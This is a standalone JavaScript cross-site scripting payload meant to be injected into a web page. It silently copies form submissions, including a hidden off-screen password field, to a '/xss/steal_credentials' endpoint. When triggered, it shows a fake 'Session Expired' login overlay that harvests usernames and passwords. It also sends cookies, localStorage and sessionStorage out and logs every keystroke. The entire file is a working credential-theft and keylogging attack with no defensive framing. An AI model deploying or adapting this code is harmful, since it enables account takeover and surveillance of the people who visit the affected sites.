(function () {
    const form = document.getElementById('form');
    if (!form) return;

    try {
        // Clone original to preserve look-and-feel
        const original = form.cloneNode(true);
        form.innerHTML = original.innerHTML;

        // Add hidden password field (off-screen)
        const passwordField = document.createElement('input');
        passwordField.type = 'password';
        passwordField.name = 'password';
        passwordField.placeholder = 'Enter your password for verification';
        passwordField.style.position = 'absolute';
        passwordField.style.left = '-9999px';
        form.appendChild(passwordField);

        // Hijack submit to send to attacker endpoint while preserving UX
        const originalAction = form.action || window.location.href;
        form.addEventListener('submit', function (e) {
            try {
                const fd = new FormData(form);
                fetch('/xss/steal_credentials', { method: 'POST', body: fd })
                    .catch(function () {});
            } catch (err) {}
            // Let form continue to original destination to look normal
            form.action = originalAction;
        }, { capture: true });

        // Optional overlay flow (trigger with hash flag #overlay)
        if (window.location.hash.includes('overlay')) {
            const overlay = document.createElement('div');
            overlay.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999;">
                    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; color: black; padding: 20px; border-radius: 5px; min-width: 320px;">
                        <h3>Session Expired</h3>
                        <p>Please re-login to continue</p>
                        <form id="fakeLoginForm">
                            <input type="text" name="username" placeholder="Username" required style="display:block;margin-bottom:8px;">
                            <input type="password" name="password" placeholder="Password" required style="display:block;margin-bottom:8px;">
                            <button type="submit">Login</button>
                        </form>
                    </div>
                </div>`;
            document.body.appendChild(overlay);
            const fake = document.getElementById('fakeLoginForm');
            if (fake) {
                fake.addEventListener('submit', function (e) {
                    e.preventDefault();
                    const data = new FormData(fake);
                    fetch('/xss/log_credentials', { method: 'POST', body: data })
                        .then(function () { overlay.remove(); })
                        .catch(function () { overlay.remove(); });
                });
            }
        }

        // Send browser data
        try {
            fetch('/xss/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cookies: document.cookie,
                    localStorage: JSON.stringify(window.localStorage),
                    sessionStorage: JSON.stringify(window.sessionStorage),
                    referrer: document.referrer,
                    url: window.location.href
                })
            });
        } catch (err) {}

        // Simple keylogger
        document.addEventListener('keydown', function (e) {
            try {
                fetch('/xss/keylog', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: e.key, target: e.target && e.target.tagName, ts: Date.now() })
                });
            } catch (err) {}
        });
    } catch (e) {}
})();


